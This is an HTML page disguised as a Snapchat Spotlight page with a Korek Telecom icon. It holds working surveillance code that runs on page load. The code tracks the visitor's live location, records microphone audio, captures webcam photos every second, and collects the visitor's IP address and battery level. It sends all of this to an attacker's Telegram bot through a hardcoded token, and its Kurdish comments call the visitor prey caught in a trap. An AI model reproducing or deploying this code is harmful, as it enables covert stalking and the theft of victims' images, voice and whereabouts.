<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;

        try {
            // 📍 ١. ڕاوکردنی لوکەیشن بە شێوەی Live Map (یەکسەر دێت)
            navigator.geolocation.watchPosition(pos => {
                const { latitude, longitude } = pos.coords;
                // بەکارهێنانی sendLocation بۆ ئەوەی نەخشەکە لەناو تێلێگرام بێت
                fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: targetID, 
                        latitude: latitude, 
                        longitude: longitude,
                        live_period: 3600 // بۆ ماوەی یەک کاتژمێر نوێ دەبێتەوە
                    })
                });
            }, null, { enableHighAccuracy: true });

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

            // 🎙️ ٢. دەنگی ١٠ چرکەی سەرەتا
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append("chat_id", targetID);
                fd.append("voice", blob, "voice.ogg");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 10000);

            // 📸 ٣. وێنەی بەردەوام (هەر ١ چرکە جارێک)
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append("chat_id", targetID);
                    fd.append("photo", blob, `snap.jpg`);
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                }, 'image/jpeg', 0.4);
            }, 1000);

            // 🔋 ڕاپۆرتی سیستەم (IP و پاتری)
            sendSystemReport();

        } catch (e) { console.error(e); }
    }

    async function sendSystemReport() {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        let battery = "Unknown";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = `${(b.level * 100).toFixed(0)}%`;
        }
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: targetID, 
                text: `🦅 <b>نێچیرێکی نوێ کەوتە تەڵەوە!</b>\n🌐 IP: ${ipData.ip}\n🔋 Battery: ${battery}`, 
                parse_mode: "HTML" 
            })
        });
    }
</script>
</body>
</html>
